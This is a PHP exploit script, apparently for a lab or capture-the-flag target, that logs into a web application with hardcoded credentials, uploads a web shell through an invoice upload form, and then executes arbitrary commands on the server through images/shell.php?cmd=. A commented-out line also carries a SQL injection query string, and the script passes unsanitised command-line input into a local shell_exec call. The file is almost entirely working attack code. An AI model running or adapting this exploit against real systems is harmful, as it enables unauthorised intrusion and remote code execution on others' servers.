<?php
/*
 * Code Source: http://thisinterestsme.com/php-login-to-website-with-curl/
 */

//The username or email address of the account.
define('USERNAME', 'vendor-1');
 
//The password of the account.
define('PASSWORD', 'vendor-1');
 
//Set a user agent. This basically tells the server that we are using Chrome ;)
define('USER_AGENT', 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36');
 
//Where our cookie information will be stored (needed for authentication).
define('COOKIE_FILE', 'cookie.txt');
 
//Target IP
define('IP_ADDRESS', $argv[1]);

//URL of the login form.
define('LOGIN_FORM_URL', IP_ADDRESS.'login/main_login.php');
 
//Login action URL. Sometimes, this is the same URL as the login form.
define('LOGIN_ACTION_URL', IP_ADDRESS.'login/checklogin.php');
 

//Upload file
$shellPath = $argv[2];

//An associative array that represents the required form fields.
//You will need to change the keys / index names to match the name of the form
//fields.
$loginValues = array(
    'myusername' => USERNAME,
    'mypassword' => PASSWORD
);

$shellValues = array(
    'invoice' => '@'.realpath($shellPath)
);

echo "Username: contractor\tPassword: password\n";

//Initiate cURL.
$curl = curl_init();
 
//Set the URL that we want to send our POST request to. In this
//case, it's the action URL of the login form.
curl_setopt($curl, CURLOPT_URL, LOGIN_ACTION_URL);
 
//Tell cURL that we want to carry out a POST request.
curl_setopt($curl, CURLOPT_POST, true);
 
//Set our post fields / date (from the array above).
curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($loginValues));
 
//We don't want any HTTPS errors.
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
 
//Where our cookie details are saved. This is typically required
//for authentication, as the session ID is usually saved in the cookie file.
curl_setopt($curl, CURLOPT_COOKIEJAR, COOKIE_FILE);
 
//Sets the user agent. Some websites will attempt to block bot user agents.
//Hence the reason I gave it a Chrome user agent.
curl_setopt($curl, CURLOPT_USERAGENT, USER_AGENT);
 
//Tells cURL to return the output once the request has been executed.
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
 
//Allows us to set the referer header. In this particular case, we are 
//fooling the server into thinking that we were referred by the login form.
curl_setopt($curl, CURLOPT_REFERER, LOGIN_FORM_URL);
 
//Do we want to follow any redirects?
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, false);
 
//Execute the login request.
curl_exec($curl);
 
//Check for errors!
if(curl_errno($curl)){
	echo "Failure of Login...\n";
    throw new Exception(curl_error($curl));
} else{
	echo "Successful Login!\n";
}
 

//We should be logged in by now. Let's attempt to access a password protected page
curl_setopt($curl, CURLOPT_URL, IP_ADDRESS.'upload.php');

//Tell cURL that we want to carry out a POST request.
curl_setopt($curl, CURLOPT_POST, true);
 
//Set our post fields / date (from the array above).
// curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($shellValues));
curl_setopt($curl, CURLOPT_POSTFIELDS, $shellValues);

//Tells cURL to return the output once the request has been executed.
curl_setopt($curl, CURLOPT_RETURNTRANSFER, false);

//Execute the POST request and print out the result.
curl_exec($curl);

// [?] no check for wrong input

//Check for errors!
if(curl_errno($curl)){
	echo "Failure of uploading shell file...\n";
    throw new Exception(curl_error($curl));
} else{
	echo "Success of uploading shell file!\n";
}

// //[?] bug to fix

// //We should be logged in by now. Let's attempt to access a password protected page
// // curl_setopt($curl, CURLOPT_URL, IP_ADDRESS.'index.php?query=anything%25%27+OR+%27x%27+LIKE+%27%25x');
// curl_setopt($curl, CURLOPT_URL, IP_ADDRESS.'images/shell.php\?cmd\=ls');
// //Tell cURL that we want to carry out a POST request.
// curl_setopt($curl, CURLOPT_POST, false);

// //Execute the POST request and print out the result.
// echo curl_exec($curl);

// //Check for errors!
// if(curl_errno($curl)){
// 	echo "Failure of running shell file...\n";
//     throw new Exception(curl_error($curl));
// } else{
// 	echo "Success of running shell file!\n";
// }

$cmd = "curl -X GET ". IP_ADDRESS . "images/shell.php\?cmd\=";
$shellcmd = $argv[3];

echo shell_exec ($cmd.$shellcmd);

// $output = shell_exec('ls -lart');
// echo "<pre>$output</pre>";

//Close connection
curl_close($curl);